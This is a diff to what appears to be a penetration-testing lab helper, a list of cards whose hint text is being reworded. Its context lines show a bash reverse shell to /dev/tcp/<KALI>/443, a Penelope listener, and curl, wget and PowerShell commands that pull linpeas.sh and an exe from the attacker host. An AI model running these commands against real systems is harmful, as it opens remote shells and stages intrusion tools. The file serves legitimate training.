@@ -712,7 +712,7 @@ python3 ~/tools/penelope/penelope.py -O -p 443
 bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'`,
     alive: "Penelope prints a session and a prompt. The shell survives a directory change and you can use its download/upload menu.",
     dead: "Listener up, nothing connects. The command never ran, or LHOST is your VPN IP written wrong.",
-    next: "The cheat sheet is the next card. id or whoami before any privesc.",
+    next: "The Listener card on this page starts Penelope and can type the menu for you. Copy the line if you want it in your own terminal. id or whoami before any privesc.",
   },
   {
     id: "sh-penelope-sheet",
@@ -793,7 +793,7 @@ curl -o /tmp/linpeas.sh http://<KALI>/linpeas.sh
 wget http://<KALI>/linpeas.sh -O /tmp/linpeas.sh`,
     alive: "The file size on the target matches Kali (ls -l both sides).",
     dead: "HTML error page saved as the script. head the file. If it starts with <html, the URL is wrong.",
-    next: "chmod +x only for binaries. Read scripts before you pipe them to bash.",
+    next: "The Transfer card fills in your tun0 address. Do not put 127.0.0.1 in the URL. chmod +x only for binaries. Read scripts before you pipe them to bash.",
   },
   {
     id: "sh-xfer-win",
@@ -805,7 +805,7 @@ powershell -c "IWR http://<KALI>/tool.exe -OutFile C:\\Users\\Public\\tool.exe"
 dir C:\\Users\\Public\\tool.exe`,
     alive: "Size matches the Kali file. file on Kali said PE32+.",
     dead: "The system cannot execute the specified program, and dir shows a few hundred bytes. You downloaded a GitHub HTML page.",
-    next: "Run from C:\\Users\\Public, not a path you cannot write.",
+    next: "The Transfer card fills in your tun0 address and this file. Run it from C:\\Users\\Public, not a path you cannot write.",
   },
   {
     id: "lin-order",
